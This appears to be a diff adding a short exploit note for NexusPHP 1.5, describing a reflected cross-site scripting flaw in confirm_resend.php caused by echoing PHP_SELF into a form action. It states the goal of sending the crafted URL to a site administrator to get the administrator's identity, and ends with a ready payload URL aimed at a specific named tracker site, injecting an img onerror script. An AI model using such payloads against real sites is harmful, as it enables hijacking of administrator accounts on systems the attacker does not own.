@@ -1,0 +1,17 @@
+# by 张宇航
+
+'''
+	Send URL to the web administrator to complete the attack,get the administrator's identity
+
+	Source:
+		confirm_resend.php:102
+			<form method="get" action="<?php echo $_SERVER['PHP_SELF'] ?>">
+	Affected software: NexusPHP 1.5
+	Software Link: http://sourceforge.net/projects/nexusphp/
+
+	Free to modify and redistribute this program.
+	Use at your own risk and you are responsible for what you are doing.
+'''
+
+exploit:
+	http://pt.btschool.net/confirm_resend.php/"><img src=1 onerror=alert(1)>/
